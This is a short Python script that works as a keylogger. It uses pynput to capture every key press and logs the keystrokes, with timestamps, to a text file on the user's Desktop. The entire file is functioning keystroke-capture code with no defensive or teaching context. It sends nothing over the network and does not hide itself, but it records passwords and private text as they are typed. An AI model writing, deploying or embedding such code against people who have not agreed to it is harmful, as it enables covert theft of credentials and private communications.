#Log keyboard input strokes
from pynput.keyboard import Listener

import os 
import logging

#Fetch username of the system
username = os.getlogin()

#Set logging directory for storing log file
logging_directory=f"C:/Users/{username}/Desktop"

#Logging into file 
logging.basicConfig(filename=f"{logging_directory}/my_log.txt",level=logging.DEBUG,format="%(asctime)s:%(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()
